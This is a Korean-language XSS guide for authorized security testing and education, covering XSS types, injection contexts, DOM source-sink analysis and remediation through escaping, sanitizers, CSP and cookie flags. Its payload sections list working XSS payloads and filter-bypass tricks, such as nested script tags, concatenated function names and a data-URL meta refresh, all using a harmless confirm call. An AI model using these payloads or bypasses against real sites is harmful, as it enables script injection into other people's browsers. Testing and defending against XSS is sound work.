# XSS: 정의 & 원리 · 기본/특수 페이로드 · 조치 가이드 (Markdown)

> **주의/범위**: 본 문서는 보안 점검·교육 목적입니다. 승인된 환경에서만 사용하세요. 고객/사내 식별 정보(도메인·URL·토큰·스크린샷)는 공개 저장소에 올리지 마십시오.

---

## 1) 정의 & 원리

### 1.1 XSS란?
사용자 브라우저에서 **의도치 않은 스크립트가 실행**되도록 만드는 취약점. 결과적으로 세션 도용, 피싱, 클릭재킹, 내부 API 오남용 등으로 이어질 수 있음.

### 1.2 구분
- **반사형(Reflected)**: 요청에 담긴 입력이 **즉시** 응답에 반영되어 실행. 링크 클릭만으로 트리거 가능.
- **저장형(Stored)**: 공격 입력이 서버/DB에 **저장**되어, 이후 해당 콘텐츠를 조회하는 모든 사용자가 영향.
- **DOM 기반(DOM XSS)**: 서버 HTML이 아니라 **클라이언트 JS**가 DOM을 조작하는 과정에서 발생(소스→싱크 흐름 문제).

### 1.3 컨텍스트(문맥) 개념
입력 값이 반영되는 위치에 따라 방어·공격 방법이 달라짐.
- **HTML 본문**: `<div>여기</div>` 내부 텍스트/노드
- **속성(Attribute)**: `value="여기"`, `title='여기'`
- **URL/프로토콜**: `href="javascript:..."`, `src="data:..."`
- **JS 문자열/식**: `var msg = "여기";`, `if (x == '여기')`
- **CSS/스타일**: `<style>`, `style="..."` (현대 브라우저에선 script 실행 경로 제한적)

### 1.4 DOM XSS의 소스/싱크(S→K) 모델
- **소스(Source)**: `location.search`, `location.hash`, `document.referrer`, `localStorage`/`sessionStorage`, `postMessage` 등 외부 입력이 유입되는 지점
- **싱크(Sink)**: `innerHTML/outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`, React `dangerouslySetInnerHTML` 등 **DOM에 HTML을 주입**하는 API
- **핵심 원리**: *신뢰되지 않은 입력*이 *HTML 파서가 실행 가능한 위치*로 들어가면 XSS 발생

### 1.5 실행 조건 & 영향 요인
- **트리거**: 무클릭(자동), 원클릭(사용자 상호작용 필요), 복수 단계(드래그·키입력·포커스 등)
- **권한/범위**: 게스트/로그인/관리자 화면, 1인/다수 사용자 영향
- **방어 요소**: CSP, 템플릿 자동 이스케이프, Sanitizer(DOMPurify), 쿠키 HttpOnly/SameSite, 프레임워크의 안전 기본값

---

## 2) 기본 페이로드 (컨텍스트별 미니멀 세트)

> 모두 **무해한 테스트용**으로 작성(확인 메시지). 상황에 맞는 **최소한의** 페이로드만 사용하세요.

### 2.1 HTML 본문
```html
<img src=x onerror=confirm('XSS_TEST')>
```
- `<script>` 차단 환경에서도 동작 가능
- 이미지 로드 실패를 `onerror`로 트리거

### 2.2 속성(Attribute) 내부
```html
" autofocus onfocus=confirm('XSS_TEST') x="
```
- 따옴표로 속성 종료 → 이벤트 핸들러 삽입
- `autofocus`/`onfocus`로 상호작용 최소화

### 2.3 공백(스페이스) 제한 환경
```html
<svg/onload=confirm('XSS_TEST')>
```
- 공백 없이 이벤트/값 배치
- 환경/브라우저 의존성 주의

### 2.4 하이퍼링크/URL 컨텍스트
```html
<a href="javascript:confirm('XSS_TEST')">Click</a>
```
- CSP가 `javascript:`를 차단할 수 있음

### 2.5 JS 문자열/식 컨텍스트
```js
";confirm('XSS_TEST');// 
```
- 문자열을 닫고 뒤에 JS 구문 삽입
- 세미콜론·주석으로 문장 정리

### 2.6 DOM 해시 주입(의심 시)
```text
#<img src=x onerror=confirm('XSS_TEST')>
```
- 응답 내 `location.hash` 사용 여부를 먼저 확인

---

## 3) 특수 페이로드 (필터/치환·정책 대응)

> 아래는 **필터/정책을 관찰**하며 제한적으로 시도하세요. 공격성/영향이 커질 수 있는 기법은 지양하고, PoC는 *확인 목적*에 한정합니다.

### 3.1 `<script>`/일부 이벤트 차단 시
```html
<details onpointerover=confirm('XSS_TEST')></details>
```
- 마우스 오버로 트리거 (`onload/onerror`가 막힌 환경 우회)

### 3.2 단어 삭제/치환 필터 우회(개념 시연)
```html
<scr<script>ipt>confirm('XSS_TEST')</scr<script>ipt>
```
- 문자열 삭제 기반 필터가 `<script>`를 제거하는 경우 조합으로 재구성
- **권장**: 차단 우회보다 안전 설계/조치 제안을 우선

### 3.3 알림 함수명 필터링(단어) 대응
```html
<svg onload="window['con'+'firm']('XSS_TEST')"></svg>
```
- 함수명을 조합해 단어 필터 회피(개념)

### 3.4 괄호 차단 환경(백틱 활용 가능 여부)
```html
<img src=x onerror=confirm`XSS_TEST`>
```
- 백틱 호출을 허용하는지 환경에 따라 다름

### 3.5 뒤에 추가 문구가 붙어 실패할 때(꼬리 자르기)
```html
<script>confirm('XSS_TEST')</script><!--
```
- 주석으로 뒤에 붙는 문자열 무력화

### 3.6 메타 리다이렉트(정책 확인 필수)
```html
<meta http-equiv="refresh" content="0;url=data:text/html,<script>confirm('XSS_TEST')</script>">
```
- `data:`/인라인 스크립트는 CSP에서 차단될 수 있음

### 3.7 인코딩·치환 전략(관찰 중심)
- URL 인코딩: `%3C %3E %22 %28 %29 ...`
- HTML 엔티티: `&#x3C; &#x3E; &#34; &#40; &#41;`
- 유니코드: `< > " ( )`
- **더블 인코딩**: `%2528` 등
- 목적: 필터가 **어디서** 적용되는지(입력/저장/출력) 확인

### 3.8 DOM XSS 전용 힌트
- 소스: `location.search/hash`, `referrer`, `storage`, `postMessage`
- 싱크: `innerHTML/insertAdjacentHTML/document.write`, jQuery `.html()`, React `dangerouslySetInnerHTML`
- 절차: 소스→싱크 흐름 추적 → 싱크 직전 **최소 페이로드 1~2개**만 시도

> **프레임워크 유의**: React/Vue의 템플릿 바인딩은 보통 안전하지만, **직접 HTML 주입 API**를 사용하면 위험해집니다.

---

## 4) 조치 가이드 (개발팀 전달용)

### 4.1 근본 원칙
- **신뢰되지 않은 입력을 HTML로 렌더링하지 않기** (문자열을 DOM에 직접 주입하지 않기)
- 템플릿/뷰 엔진의 **자동 이스케이프** 기능 활성화

### 4.2 컨텍스트별 출력 이스케이프
- **HTML 본문**: `<` `>` `&`를 엔티티로
- **속성 값**: 위 + `"` `'` 추가 이스케이프, 이벤트 핸들러 내 표현 금지
- **URL**: 쿼리 구성은 URL 인코딩, `javascript:`/`data:` 프로토콜 금지
- **JS 문자열/식**: 따옴표/백슬래시 이스케이프, 템플릿 리터럴 주의

### 4.3 안전한 API 사용
- 지양: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`
- 권장: `textContent`, `setAttribute`(검증된 화이트리스트 값만), 프레임워크의 안전 바인딩

### 4.4 Sanitizer
- **DOMPurify** 등 검증된 Sanitizer를 사용(정책은 **화이트리스트 기반**)
- 자체 정규식/블랙리스트로 HTML 정화하지 말 것(우회 가능)

### 4.5 CSP(Content Security Policy)
- 기본 예시(상황에 맞게 조정):
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
  ```
- **nonce/hash 기반** 인라인 허용이 필요하면 일관되게 관리
- `report-uri/report-to`로 탐지·관측 활성화

### 4.6 쿠키/세션 안전 설정
- `HttpOnly; Secure; SameSite=Lax(or Strict)`
- 토큰은 URL/해시에 노출하지 않기

### 4.7 프로세스/품질 게이트
- 신규 화면 릴리스 전 **컨텍스트별 출력 테스트** 포함
- 정적 분석/리뷰에서 `innerHTML/.html()/dangerouslySetInnerHTML` 사용 탐지
- 리그레션 방지를 위한 **단위/통합 테스트**에 PoC 샘플 포함

---

© 2025 XSS Guide — 연구/내부 점검 용도
